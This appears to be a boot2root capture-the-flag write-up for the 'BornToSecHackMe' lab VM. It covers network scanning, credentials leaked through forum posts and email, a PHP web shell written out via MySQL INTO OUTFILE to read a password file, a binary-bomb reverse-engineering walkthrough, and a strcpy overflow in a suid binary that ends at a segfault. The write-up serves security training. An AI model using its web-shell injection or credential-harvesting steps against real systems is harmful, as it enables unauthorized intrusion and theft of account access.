# BOOT 2 ROOT

## Find VM IP address :
 - use ifconfig to find VMWare network mask
 - use nmap to identify ip : `nmap 192.168.142.1/24`

```
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-13 14:42 CET

```
 - The IP is **192.168.142.130** and we have some services running : FTP, SSH, HTTP, HTTPS


## Find Web Services with a Scanner

  - We used nikto to crawl HTTPS services :

  ```
  gcl https://github.com/sullo/nikto.git /tmp/nikto
  cd /tmp/nikto/program/
  ./nikto.pl -h https://<host>
  ```

  We also used `dirb` which is an alternative to nikto. Both output are in the folder `/scanner/`

  We found 3 main services running :
  - A forum on `/forum/`
  - A webmail service
  - A PhpMyAdmin service



## Getting Access to the database

While looking at the forum's posts, we find out that the **problem login** post contains a password to connect to lmezard email account :
```
Oct 5 08:45:27 BornToSecHackMe sshd[7547]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 08:45:27 BornToSecHackMe sshd[7547]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=161.202.39.38-static.reverse.softlayer.com
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
```

We can use that to access to her webmail and find out this email * laurie@borntosec.net* / `!q\]Ej?*5K5cy*AJ`
```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

We can then connect to the database as root.


## Using PhpMyAdmin to access Server

#### Where to store the backdoor shell in apache server ?
We want to insert a file in the server thx to the mysql root account. This file will include a kind of backdoor shell executing commands and returning result on the webpage.

We need to be able to store the php script in the `/var/www` folder served by apache. The forum service is named `my little forum` (see bottom page of forum). Thanks to its [github page](https://github.com/ilosuna/mylittleforum) we can find a path that we should be able to use in order upload a file :

```
Depending on your server configuration the write permissions of the subdirectory templates_c (CHMOD 770, 775 or 777) and the file config/db_settings.php (CHMOD 666) might need to be changed in order that they are writable by the script.
```

We use the ISO file to know the content of the filesystem. (Read **mount_iso.md**)  
We notice a nice path : **/home/LOOKATME/password**  

#### Shell backdoor ?

This allow us to run shell commands through the web server.
- store file : `SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/forum/templates_c/test.php"`
- browse at : `<vm_ip>/forum/templates_c/test.php?cmd=cat /home/LOOKATME/password`
- result : `lmezard:G!@M6f4Eatau{sF"`

We can now connect to **lmezard** account on VM (or get files with `ftp`).


## LMEZARD level

#### Get files

We gonna use `ftp` command to fetch documents from `lmezard` home :
```
âžœ  ~ ftp lmezard@<VM_IP>
Connected to 172.16.34.131.
220 Welcome on this server

ftp> get fun
```

#### fun archive

```
cd /tmp/lmezard/
tar -xvf fun
cd ft_fun
cat * | grep 'return'
```

Lot of files, containing various instructions in **C**.  
We understood that we needed to merge them. Each file has a number on it : `//fileXXX` where XXX is a file number. We write a python script (`/lmezard/merge_files.py`) to read all files and merge them in the good order. We can then compile the merged program. By running it we get the password.

- `Iheartpwnage` -> sha256 = `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

## laurie's bomb

We entered Laurie's home directory and we have :
- a **README** with :
```
  laurie@BornToSecHackMe:~$ cat README
  Diffuse this bomb!
  When you have all the password use it as "thor" user with ssh.

  HINT:
  P
   2
   b

  o
  4

  NO SPACE IN THE PASSWORD (password is case sensitive).
```
- a **bomb** binary
```
  laurie@BornToSecHackMe:~$ file bomb
  bomb: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.0.0, not stripped
```

Let's try it out !!!
```
laurie@BornToSecHackMe:~$ ./bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
123

BOOM!!!
The bomb has blown up.
```

We have 6 stages to decrypt. Let's crack'em down. We are using gdb with *peda* framework to easier the process.
The translation in *pseudo-C* of most important functions are in the file `/laurie/stages.c`

### Stage 1

Those are the general command to achieve the level.
We have a call to a function checking 2 strings to compare equality. One is our input and the other is : `0x80497c0 ("Public speaking is very easy.")`

```
gdb bomb
b phase_1
run
<enter input for level1>
ni (until before strings_not_equal call)
```

### Stage 2

- `read_six_numbers` -> scan 6 numbers ("%d %d %d %d %d %d"). Explode if less than 6 numbers.
- Enter a loop and expect each number to be `index+1` time the previous one : 
  - **1 2 6 24 120 720** (1 x 2 = 2, 2 x 3 = 6, 6 x 4 = 24, ...)

  The solution is : `1 2 6 24 120 720`


### Stage 3

We need to unter a passwor composed of : `%d %c %d`  
by analysing the assembly code we get whats going on. Depending on the first number we have different combination that works, but only one is intersting for us. We need a **b** as a second argument, so we have 4 possibilities, after trying them all we get :
```
1 b 214
2 b 755
7 b 524
```

### Stage 4

This one is easy, it takes a single integer and a recursive function computes on it. We then need to have `func4(nb) == 55`. We did a python script (`/laurie/stage_4.py`) to simulate **func4** and the answer is 9.

### Stage 5

this one is a little trickier :
We have to build a string that is equal to `giants`.
- The program has a main string : `"isrveawhobpnutfg\260\001"`
- The input we give is used as indexes to pick a char in main string. (eg. **'000000'** -> **'iiiiii'**) However only the last 4 bytes value is taken into account : "1234**5678**" -> `5678`

So we need to pick indexes (knowing that 1st char is `o`) :
- 15 -> `o`
- 0 -> `p`
- 5 -> `e`
- 11 -> `k`
- 13 -> `m`
- 1 -> `q`

### Stage 6

The steps of this level are :
- read 6 numbers (the first one is `4` thx to the README tip)
- check that each number are different & below 6
- build a new buffer on number indexed on input value (buffer[4], buffer[2])
- then checks if the new buffer is ordered in decreased order.
- the buffer on number being `[253, 725, 301, 997, 212, 432]` :
  - the solution is  `[4, 2, 6, 3, 1, 5]`



### The full solution
The different passwords are (after trying to connect as thor with multiple possible passwords from stage3):
```
Public speaking is very easy.
1 2 6 24 120 720
1 b 214
9
opekmq
4 2 6 3 1 5
```
which gives us : `Publicspeakingisveryeasy.126241207201b2149opekmq426135`

## Thor level
This level contains a **turtle** file containing various commands : 
```
...
Avance 1 spaces
Tourne droite de 1 degrees
Avance 50 spaces

Avance 100 spaces
Recule 200 spaces
...
```

We found out that turtle is a [python package](https://docs.python.org/3.3/library/turtle.html?highlight=turtle) that allow us to draw figures by moving a "turtle".
We realized a python script (`/thor/turtle.py`) that parses the **turtle file** and draw the content.
However this script doesnt work in the *VM* because it uses a graphical interface **tkinter**. Se we copy the file and run it on the host:
```
scp thor@<vm_ip>:turtle /tmp/turtle
cp <python_script_path> /tmp/thor.py
cd /tmp/
python /tmp/thor.py
```

#### What does it draw
It draws the word : **SLASH**.
We can now connect as **zaz** user by hashing it with `md5` function.
-> `646da671ca01bb5d84dbb5fb2238dc8e`

## Zaz level

## Analyse

There is a suid root bin in home directory 'exploit_me'.

```bash
zaz@BornToSecHackMe:~$ ls -l
total 5
-rwsr-s--- 1 root zaz 4880 Oct  8  2015 exploit_me
drwxr-x--- 3 zaz  zaz  107 Oct  8  2015 mail
```

The executable use unsafe function strcpy. Strcpy write into static buffer from user argument.

```bash
zaz@BornToSecHackMe:~$ ltrace ./exploit_me TOTO
__libc_start_main(0x80483f4, 2, 0xbffff7e4, 0x8048440, 0x80484b0 <unfinished ...>
strcpy(0xbffff6c0, "TOTO")                                                                                      = 0xbffff6c0
puts("TOTO"TOTO
)                                                                                                    = 5
+++ exited (status 0) +++
```

We can put exploit_me in default by giving it an argument of great length

```bash
zaz@BornToSecHackMe:~$ ./exploit_me BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Segmentation fault (core dumped)
